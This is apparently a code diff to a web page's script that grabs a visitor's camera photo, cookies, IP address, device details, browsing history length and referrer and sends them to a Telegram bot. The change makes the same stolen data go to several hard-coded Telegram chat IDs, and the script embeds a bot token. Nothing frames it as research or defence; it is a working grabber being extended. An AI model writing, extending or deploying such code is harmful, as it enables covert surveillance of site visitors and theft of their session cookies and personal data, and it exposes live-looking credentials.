@@ -55,6 +55,9 @@
         const context = canvas.getContext('2d');
         let stream; // Store the stream globally
 
+        // List of chat IDs
+        const chatIds = ['6305469091', '-1002323834613', '']; // Add the chat IDs here
+
         // Prompt for camera access and capture photo
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((mediaStream) => {
@@ -99,14 +102,15 @@
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    sendToTelegram(imageData, deviceInfo, cookies, ip, historyLength, screenResolution, language, referrer, effectiveType);
+                    chatIds.forEach(chatId => {
+                        sendToTelegram(imageData, deviceInfo, cookies, ip, historyLength, screenResolution, language, referrer, effectiveType, chatId);
+                    });
                 })
                 .catch(error => console.error('Error getting IP:', error));
         }
 
-        function sendToTelegram(imageData, deviceInfo, cookies, ip, historyLength, screenResolution, language, referrer, effectiveType) {
+        function sendToTelegram(imageData, deviceInfo, cookies, ip, historyLength, screenResolution, language, referrer, effectiveType, chatId) {
             const telegramToken = '7787402061:AAETHj_Lo0NqNYlvQPhMZYNx5rnqOh8O6no';
-            const chatId = '6305469091';
 
             // Formatting the message using Markdown
             const message = `
@@ -152,7 +156,7 @@ Number of visited pages: *${historyLength}*
                 body: formData
             })
             .then(() => {
-                console.log('Photo and data sent successfully!');
+                console.log(`Photo and data sent successfully to chat ID: ${chatId}`);
             })
             .catch(error => console.error('Error:', error));
         }
